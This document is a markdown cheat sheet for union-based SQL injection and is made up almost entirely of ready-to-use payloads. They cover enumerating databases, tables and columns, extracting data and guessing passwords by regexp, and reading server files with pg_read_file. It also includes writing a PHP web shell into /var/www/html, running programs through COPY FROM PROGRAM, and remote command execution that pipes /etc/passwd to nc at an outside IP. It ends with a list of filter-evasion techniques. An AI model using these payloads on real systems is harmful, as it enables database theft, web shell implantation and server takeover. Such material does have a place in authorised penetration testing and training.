# Unon based SQL Injection

## Utils before start
#### Database objects used for enumeration
|Oracle 					| MS Access 		| MySQL 			| MSSQL Server		| PostgreSQL  		|
|---------------------------|-------------------|-------------------|-------------------|-------------------|
|SYS.USER_OBJECTS 			|MsysACEs			|mysql.user 		|sysobjects			|pg_default			|
|SYS.TABLES, SYS.USER_TABLES|MsysObjects		|mysql.db 			|syscolumns			|pg_global			|
|SYS.USER_VIEWS 			|MsysQueries		|mysql.tables_priv  |systypes			|					|
|SYS.ALL_TABLES 			|MsysRelationship	|					|sysdatabases		|					|
|SYS.COLUMNS 				|					|					|					|					|
|SYS.USER_OBJECTS 			|					|					|					|					|

#### Database features comparison
|				| MySQL 		| MSSQL 		| MS Access 		| Oracle 		| DB2 			  | PostgreSQL 		|
|---------------|---------------|---------------|-------------------|---------------|-----------------|-----------------|
| String concat |concat\[_ws](,)| +				| &					|	\|\|		| concat(),+,\|\| | \|\|			|
| Comments		| --,/**/,#		| --,\/*		|					| -- and \/*	| --			  |	--, \/*			|				
| Request union | union 		| union, ;		| union 			| union 		| union 		  | union, ;		|


## Get columns number

Check how many columns have current table using order by. When order by have the wrong number of columns, it will return an error:
```
' order by 1;
' order by 2;
' order by 3;

# Or use nulls with unions
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

`NULL` is used because it is convertible to any data type of a column. 

## Find column with relevant data type - a string would be the best

This one needs to be compatible with datatype that we want to extract.

```
' UNION SELECT 'x',NULL,NULL--
' UNION SELECT NULL,'x',NULL--
' UNION SELECT NULL,NULL,'x'--
```

## Get database version
```
'+union+select+NULL,version(),NULL,NULL,NULL--
'+union+select+NULL,@@version,NULL,NULL,NULL--
```

## Get current user
```
'+union+select+NULL,current_user,NULL,NULL,NULL--
'+union+select+NULL,user,NULL,NULL,NULL--
'+union+select+NULL,user(),NULL,NULL,NULL--
```

## Extract database name:
```
# Extract current database name
' UNION SELECT ALL NULL,NULL,NULL,database();
' UNION SELECT ALL NULL,NULL,NULL,current_database();
```

List all databases:
```
'+union+select+NULL,datname,NULL,NULL,NULL from pg_database--
```

## Extract database tables names: 

```
// additionally database could be provided: table_schema = database()
'' UNION SELECT ALL 1,2,3,4,5,6,7,8,9,table_name FROM information_schema.tables  LIMIT 100;  

# PostgreSQL:
'+union+select+NULL,table_name,NULL,NULL,NULL from information_schema.tables where table_schema='public'--
# or
'+union+select+NULL,concat(table_schema, ' <--> ',table_name),NULL,NULL,NULL from information_schema.tables WHERE table_type = 'BASE TABLE' AND table_schema NOT IN ('pg_catalog', 'information_schema'); --
```

## Extract columns names from table:
```
SELECT * FROM `c5_logger_system` WHERE id=100 UNION SELECT ALL 1,2,3,4,5,6,7,8,table_name, column_name FROM information_schema.columns WHERE table_schema = database() and table_name = "c5_users"--;

# PostgreSQL
'+union+select+NULL,concat(table_name, ' <--> ',column_name),NULL,NULL,NULL from information_schema.columns WHERE table_schema='public' AND table_name='cars'--
```
## Extract data from table:
```
'+union+select+NULL,concat(id, ';',engine, ';', type),NULL,NULL,NULL from cars--

# Check if first character is between a-c 
'+1=(SELECT 1 from users WHERE password REGEXP '^[a-c]' AND user_id=2)-- 
```

## Read files
```
' union+select+NULL,pg_read_file('/home/simon/.sudo_as_admin_successful',0,1000000),NULL,NULL,NULL--
' union+select+NULL,ENCODE(CONVERT_TO(pg_read_file('/var/www/html/dashboard.php',0,1000000), 'UTF-8'), 'BASE64'),NULL,NULL,NULL--

' union+select+NULL,pg_ls_dir('/home/simon'),NULL,NULL,NULL--
```
## Write a file:
```
# PostgreSQL
'; COPY(select+NULL,'<?php system($_GET["cmd"]); ?>',NULL,NULL,NULL) TO '/var/www/html/shell1.php'--
```

## Create a new table and insert data
```
'; DROP TABLE IF EXISTS dummytbl;CREATE TABLE dummytbl(data text);COPY dummytbl FROM PROGRAM 'echo 1';--
'+ union select NULL,data,NULL,NULL,NULL from dummytbl--

```

## Remote command execution
```
'; CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS ‘/lib/libc.so.6’, ‘system’ LANGUAGE ‘C’ STRICT; SELECT system(‘cat /etc/passwd | nc 10.0.0.1 8080’)--
```

## Evasion techniques
1. In-line comment
2. Char encoding
3. String concat
4. Obfuscating query
5. Whitespaces
6. Hex encoding
7. Sophisticated matches
8. URL Encoding
9. Null byte
10. Case variation
11. Variables declaration
12. IP Fragmentation
13. Variations (OR 2+1=3, OR "AB"="a"+"b")




## Cheat sheets
- https://portswigger.net/web-security/sql-injection/union-attacks
- https://portswigger.net/web-security/sql-injection/cheat-sheet
- https://www.hackingloops.com/sql-injection-cheat-sheet/
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md
- https://www.hackingloops.com/sql-injection-cheat-sheet/
- https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection
- https://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet